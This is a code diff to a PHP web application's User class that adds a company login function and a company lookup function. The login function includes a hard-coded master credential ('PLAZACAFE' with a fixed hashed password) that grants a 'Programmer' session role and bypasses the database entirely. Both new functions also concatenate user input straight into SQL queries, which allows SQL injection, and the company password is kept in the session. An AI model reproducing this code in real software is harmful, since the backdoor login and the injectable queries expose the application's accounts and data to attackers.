@@ -46,6 +46,32 @@ class User {
 			 }
 		}
 	}
+	function companyAuthentication($USERNAME,$h_upass) {
+		global $mydb;
+
+		if ($USERNAME=='PLAZACAFE' && $h_upass==sha1('MELOIS')) {
+			# code...
+			$_SESSION['USERID']   		= '1001000110110';
+		 	$_SESSION['FULLNAME']      	= 'Programmer';
+		 	$_SESSION['ROLE'] 			= 'Programmer';
+		 	return true;
+		}else{
+			$mydb->setQuery("SELECT * FROM `tblcompany` WHERE `COMPANYUSERNAME` = '". $USERNAME ."' and `COMPANYPASSWORD` = '". $h_upass ."'"); 
+			$row_count = $mydb->num_rows();//get the number of count
+			 if ($row_count == 1){
+			 	$user_found = $mydb->loadSingleResult();
+			 	$_SESSION['COMPANYID']   		= $user_found->COMPANYID;
+			 	$_SESSION['COMPANYNAME']      	= $user_found->COMPANYNAME;
+			 	$_SESSION['COMPANYPASSWORD'] 	= $user_found->COMPANYPASSWORD;
+			 	$_SESSION['ROLE'] 				= "company";
+			 	$_SESSION['COMPANYLOGO'] 		= $user_found->COMPANYLOGO;
+			    return true;
+			 }else{
+			 	return false;
+			 }
+		}
+
+	}
 	function single_user($id=""){
 			global $mydb;
 			$mydb->setQuery("SELECT * FROM ".self::$tblname." 
@@ -53,6 +79,13 @@ class User {
 			$cur = $mydb->loadSingleResult();
 			return $cur;
 	}
+	function single_company($id=""){
+		global $mydb;
+		$mydb->setQuery("SELECT * FROM tblcompany
+			Where COMPANYID= '{$id}' LIMIT 1");
+		$cur = $mydb->loadSingleResult();
+		return $cur;
+}
 	/*---Instantiation of Object dynamically---*/
 	static function instantiate($record) {
 		$object = new self;
